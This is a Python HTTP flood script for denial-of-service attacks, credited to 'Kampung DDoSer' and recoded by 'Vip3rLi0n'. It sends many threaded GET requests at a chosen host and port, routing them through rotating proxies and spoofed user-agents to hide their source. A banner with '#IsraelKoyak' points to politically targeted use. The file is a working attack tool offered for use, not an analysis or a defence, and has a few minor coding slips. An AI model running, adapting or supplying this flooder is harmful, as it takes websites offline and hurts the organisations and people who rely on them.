# -*- coding: utf-8 -*-
# Original Author : Kampung DDoSer
# Recoded and Updated by Vip3rLi0n

import random
import string
import threading
import requests
import argparse
import time

parser = argparse.ArgumentParser(description="HTTP Flood by Kampung DDoSer")
parser.add_argument("hostname", help="Hostname or IP address (http://example.com / https://example.com)")
parser.add_argument("port", type=int, help="Port")
parser.add_argument("requests", type=int, help="Number of requests")
parser.add_argument("proxy_type", default="socks5", help="Proxy type (http, https, socks4, socks5)")
parser.add_argument("--proxy", default="proxy.txt", help="Path to proxy file (default: proxy.txt)")
parser.add_argument("--ua", default="ua.txt", help="Path to user-agent file (default: ua.txt)")
args = parser.parse_args()

ip = ""
port = args.port
num_requests = args.requests

thread_num = 0
thread_num_mutex = threading.Lock()

def proxy_list(file_path):
    with open(file_path, 'r') as file:
        proxy_list = file.read().splitlines()
    return proxy_list

def user_agents(file_path):
    with open(file_path, 'r') as file:
        ua = file.read().splitlines()
    return ua

async def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def attack(session, proxy, ua, time_str):
    user_agent = random.choice(ua)
    prox_type = args.proxy_type
    if prox_type == 'http':
        proxy_get = {"http": proxy}
    elif prox_type == 'https':
        proxy_get = {"https": proxy}
    elif prox_type == 'https':
        proxy_get = {"socks4": proxy}
    else:
        proxy_get = {"socks5": proxy}

    try:
        response = session.get(f"{args.hostname}:{port}/", headers={"User-Agent": user_agent}, proxies=proxy_get, timeout=10)
        response_text = response.text
        if response_text:
            print(f'[{time_str}] Target Attacked from: {proxy}')
    except requests.Timeout:
        print(f'[{time_str}] Request timed out from: {proxy}')
    except Exception as e:
        print(f'[{time_str}] Attack Failed from: {proxy}')

def main():
    proxies = proxy_list(args.proxy)
    ua = user_agents(args.ua)
    print("#-#-# This Is Kampung DDoSer #IsraelKoyak #-#-#\n")
    print(f"[#] Attack started on {args.hostname} || Port: {str(port)} || # Requests: {str(num_requests)}")

    with requests.Session() as session:
        threads = []

        for i in range(num_requests):
            current_time = time.localtime()
            time_str = time.strftime("%I:%M:%S %p", current_time)
            proxy = random.choice(proxies)
            thread = threading.Thread(target=attack, args=(session, proxy, ua, time_str))
            thread.start()
            threads.append(thread)
            time.sleep(0.01)

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()